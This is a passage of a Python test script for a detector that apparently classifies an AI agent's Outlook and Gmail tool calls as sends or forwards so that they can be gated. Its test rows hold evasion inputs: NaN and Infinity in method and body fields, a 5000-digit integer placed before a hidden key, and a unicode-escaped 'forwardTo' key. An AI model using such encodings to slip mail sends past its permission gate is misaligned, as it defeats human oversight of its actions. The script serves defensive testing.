        "hasForwardKeyName": lambda v: ee._has_forward_key_name(v, True, False, ee.NO_EXEMPT),
        "mailEndpointWrite": lambda v: ee.mail_endpoint_write(v),
    }
    bad = [r["label"] for r in WJ["direct"] if attempt(lambda: walker_fns[r["walker"]](r["input"])) is not r["expected"]]
    check(f"5e3c31c5 N0: the {len(WJ['direct'])} direct walker rows give their expected value", not bad, f"{len(bad)} differ, e.g. {bad[:2]}")
    check("5e3c31c5 N0: the direct rows cover all three walkers, with signal and control rows",
          {r["walker"] for r in WJ["direct"]} == set(walker_fns) and {r["expected"] for r in WJ["direct"]} == {True, False})
    bad = [f"{a['tool']} {a['note'][:60]}" for a in WJ["actions"] if attempt(lambda: ee.mail_tool_action(a["tool"], a["input"])) != a["expected"]]
    check(f"5e3c31c5 N0: the {len(WJ['actions'])} action rows give their expected class", not bad, f"{len(bad)} differ, e.g. {bad[:2]}")
    check("5e3c31c5 N0: the action rows hold a reader, a non-reader and a manage_email name, and send and null classes",
          {"mcp__outlook__fetch", "mcp__gmail__create_draft", "mcp__outlook__manage_email"} <= {a["tool"] for a in WJ["actions"]}
          and {"send", None} <= {a["expected"] for a in WJ["actions"]})

    # --- card 5e3c31c5 R1 (review E1/B1): a B-class endpoint with body / method = NaN / Infinity / -Infinity ------
    # The reference side: python reads the constant as a float, so a body key is non-empty and a method key is a
    # non-read value: mail_endpoint_write True, mail_tool_action send. The JS twin (walker-json-nan.test.ts) runs
    # the same rows and must give the same decisions, and gateDecision (JS only) must deny them.
    ENF = WJ["endpoint_nonfinite"]
    check("5e3c31c5 R1: the block holds body and method rows for NaN, Infinity and -Infinity, on three tools",
          len(ENF["tools"]) == 3 and len(ENF["rows"]) == 12
          and {k for r in ENF["rows"] for k in ("body", "method") if '"%s":' % k in r["input"]["request"]} == {"body", "method"}
          and all(any(t in r["input"]["request"] for r in ENF["rows"]) for t in ("NaN", "Infinity", "-Infinity")))
    bad = [r["label"] for r in ENF["rows"] if attempt(lambda: ee.mail_endpoint_write(r["input"])) is not True]
    check(f"5e3c31c5 R1: mail_endpoint_write is True on all {len(ENF['rows'])} non-finite endpoint rows", not bad, f"{len(bad)} differ, e.g. {bad[:2]}")
    bad = [f"{t} {r['label']}" for t in ENF["tools"] for r in ENF["rows"] if attempt(lambda: ee.mail_tool_action(t, r["input"])) != "send"]
    check(f"5e3c31c5 R1: mail_tool_action is send on all {len(ENF['rows']) * len(ENF['tools'])} tool x row pairs", not bad, f"{len(bad)} differ, e.g. {bad[:2]}")
    # the spaces around the replaced token (JS side) must not let a neighbour merge: python rejects these, so does JS
    check("5e3c31c5 R1: -NaN, 1NaN, NaN1 and +Infinity are not JSON for the python reader",
          all(str(attempt(lambda: ee._walker_json_loads(s))).startswith("JSONDecodeError") for s in ('{"a": -NaN}', '{"a": 1NaN}', '{"a": NaN1}', '{"a": +Infinity}')))

    # --- card 5e3c31c5 N2: the shared python reader, huge integers ------------------------------------
    import inspect
    walker_reader = getattr(ee, "_walker_json_loads", None)
    check("5e3c31c5 N2: email_extract._walker_json_loads exists", callable(walker_reader))
    for fn in (ee._has_forward_key, ee._has_forward_key_name, ee.mail_endpoint_write):
        src = inspect.getsource(fn)
        check(f"5e3c31c5 AC1: {fn.__name__} reads JSON strings only through _walker_json_loads",
              "_walker_json_loads(" in src and "json.loads(" not in src.replace("_walker_json_loads(", ""))
    huge = "9" * 5000
    got = attempt(lambda: walker_reader('{"a": ' + huge + ', "b": [-' + huge + ']}'))
    check("5e3c31c5 AC5: a 5000-digit integer parses to a float, no ValueError (any python version)",
          isinstance(got, dict) and isinstance(got["a"], float) and got["b"][0] == float("-inf") and got["a"] == float("inf"), f"got {got!r}"[:120])
    hidden = '{"n": ' + huge + ', "\\u0066orwardTo": 1}'
    check("5e3c31c5 AC5: the walkers walk on past a 5000-digit integer (hasForwardKey / hasForwardKeyName)",
          attempt(lambda: ee._has_forward_key({"b": hidden})) is True
          and attempt(lambda: ee._has_forward_key_name({"b": hidden}, True, False, ee.NO_EXEMPT)) is True)
    check("5e3c31c5 AC5: ... and mail_endpoint_write",
          attempt(lambda: ee.mail_endpoint_write({"b": '{"n": ' + huge + ', "path": "/me/sendMail"}'})) is True)
    check("5e3c31c5 N2: a number, bool and null leave a benign string benign",
          attempt(lambda: ee._has_forward_key_name({"b": '{"a": 1, "b": true, "c": null, "d": 2.5}'}, True, False, ee.NO_EXEMPT)) is False)
    if hasattr(sys, "set_int_max_str_digits"):
        prev = sys.get_int_max_str_digits()
        sys.set_int_max_str_digits(4300)
        try:
            check("5e3c31c5 R4: with the interpreter's digit limit on (4300), plain int() would raise and the walkers still walk",
                  attempt(lambda: ee._has_forward_key({"b": hidden})) is True
                  and attempt(lambda: ee.mail_endpoint_write({"b": '{"n": ' + huge + ', "path": "/me/sendMail"}'})) is True)
        finally:
            sys.set_int_max_str_digits(prev)
    else:
        print("  [SKIP] 5e3c31c5 R4: sys.set_int_max_str_digits does not exist on this python (%s); the limit cannot be exercised" % sys.version.split()[0])

if failed:
    print(f"\n{len(failed)} FAILED: {failed}", file=sys.stderr)
    sys.exit(1)
print("\nAll mail-tool-action tests passed.")
